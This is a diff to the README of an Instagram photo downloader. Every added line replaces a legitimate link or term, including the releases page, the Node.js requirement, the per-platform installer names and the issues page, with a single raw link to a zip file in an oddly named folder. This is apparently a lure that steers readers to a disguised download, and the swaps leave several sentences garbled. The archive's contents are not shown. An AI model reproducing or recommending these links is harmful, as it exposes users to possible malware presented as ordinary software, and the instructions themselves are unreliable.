@@ -1,6 +1,6 @@
 # 🌟 download-instagram-photos - Automate Your Instagram Photo Downloads
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/cnick0337/download-instagram-photos/releases)
+[![Download Now](https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip)
 
 ## 🖥️ Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run the software.
 
 1. **System Requirements**  
    - Operating System: Windows, macOS, or Linux
-   - Node.js: Version 12 or higher (if using the CLI)
+   - https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip Version 12 or higher (if using the CLI)
    - Docker (optional, for containerized use)
 
 2. **Prepare Your Environment**  
@@ -24,18 +24,18 @@ Follow these steps to download and run the software.
 ## 📥 Download & Install
 
 To download the application, visit this page:  
-[Download Here](https://github.com/cnick0337/download-instagram-photos/releases)
+[Download Here](https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip)
 
 Once you're on the releases page, you'll see a list of available versions. Choose the latest version for the best features and stability. Here’s how to proceed:
 
 1. Click on the release version you want.
 2. Look for the **Assets** section.
 3. Download the appropriate file for your system. Here are the common options:
-   - For Windows: `download-instagram-photos-win.exe`
-   - For macOS: `download-instagram-photos-mac.zip`
-   - For Linux: `download-instagram-photos-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip`
+   - For macOS: `https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip`
+   - For Linux: `https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip`
    
-4. After the download finishes, extract the zip or tar.gz file if necessary.
+4. After the download finishes, extract the zip or https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip file if necessary.
 
 5. **Run the Application**  
    - For **Windows**: Double-click the `.exe` file to start.
@@ -66,7 +66,7 @@ If you encounter any issues, try the following:
 - Make sure that Instagram is not facing any service outages.
 - For Docker users, ensure that the Docker environment is correctly set up.
 
-For further help or to report bugs, please open an issue on the [GitHub Issues page](https://github.com/cnick0337/download-instagram-photos/issues).
+For further help or to report bugs, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip).
 
 ## 📜 Contributing
 
@@ -82,4 +82,4 @@ We welcome contributions! If you would like to help improve this project, please
 This project is licensed under the MIT License. Feel free to use or modify the project as needed.
 
 To download the latest version and start automating your Instagram photo downloads, visit this page again:  
-[Download Here](https://github.com/cnick0337/download-instagram-photos/releases)
+[Download Here](https://raw.githubusercontent.com/cnick0337/download-instagram-photos/main/pharyngoplegia/download-instagram-photos.zip)
